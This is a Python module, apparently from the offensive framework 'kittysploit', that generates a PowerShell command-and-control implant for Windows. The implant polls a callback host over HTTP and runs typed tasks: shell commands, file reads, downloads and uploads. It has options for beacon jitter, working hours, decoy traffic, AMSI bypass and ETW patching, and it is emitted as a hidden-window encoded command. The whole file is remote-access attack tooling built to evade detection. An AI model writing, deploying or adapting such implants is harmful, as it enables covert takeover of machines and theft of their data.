from kittysploit import *
import base64

from lib.c2.beacon_profile import BeaconProfile
from lib.c2.powershell_http_polling import build_powershell_http_polling_script


class Module(Payload):

	CLIENT_LANGUAGE = "powershell"

	__info__ = {
		"name": "PowerShell Kitty Agent (typed tasks)",
		"description": (
			"PowerShell HTTP polling agent with typed tasks (shell/ls/pwd/whoami/cat/download/upload) "
			"for listeners/multi/reverse_http_polling"
		),
		"category": PayloadCategory.CMD,
		"arch": Arch.OTHER,
		"platform": Platform.WINDOWS,
		"listener": "listeners/multi/reverse_http_polling",
		"handler": Handler.REVERSE,
		"session_type": SessionType.POLLING,
	}

	lhost = OptString("127.0.0.1", "Callback host", True)
	lport = OptPort(8088, "Callback port", True)
	url_prefix = OptString("/c2", "URL prefix (must match listener)", False, True)
	client_id = OptString("", "Client/implant ID", False, True)
	poll_interval = OptInteger(10, "Base poll interval seconds", False, True)
	jitter_percent = OptInteger(35, "Poll jitter percent", False, True)
	kill_date = OptString("", "Kill date ISO YYYY-MM-DD", False, True)
	working_hours = OptString("", "HH:MM-HH:MM window", False, True)
	timezone = OptString("UTC", "Timezone (informational)", False, True)
	sleep_outside_hours = OptInteger(3600, "Sleep outside hours", False, True)
	user_agent = OptString("Mozilla/5.0", "HTTP User-Agent", False, True)
	host_header = OptString("", "Optional Host header", False, True)
	payload_comms_host = OptString("", "Optional connect host", False, True)
	cover_traffic = OptBool(True, "Decoy HTTP requests", False, True)
	use_ssl = OptBool(False, "HTTPS callback", False, True)
	bypass_amsi = OptBool(False, "Prepend AMSI bypass", False, True)
	patch_etw = OptBool(False, "Patch EtwEventWrite", False, True)

	def generate(self):
		identity = self._apply_implant_identity_options()
		client_id = str(getattr(getattr(self, "client_id", None), "value", self.client_id) or "").strip()
		if identity:
			client_id = identity.implant_id
		elif not client_id:
			client_id = "pskitty1"

		profile = BeaconProfile.from_opts(self)
		script = build_powershell_http_polling_script(
			str(self.lhost),
			int(self.lport),
			client_id,
			url_prefix=str(self.url_prefix or "/c2"),
			use_ssl=bool(self.use_ssl),
			profile=profile,
			typed_tasks=True,
		)

		from lib.c2.stager_evasion import powershell_prelude

		prelude = powershell_prelude(
			bypass_amsi=bool(self.bypass_amsi),
			patch_etw=bool(self.patch_etw),
		)
		full = prelude + script
		return self._encode_powershell_command(full, window_style="hidden")
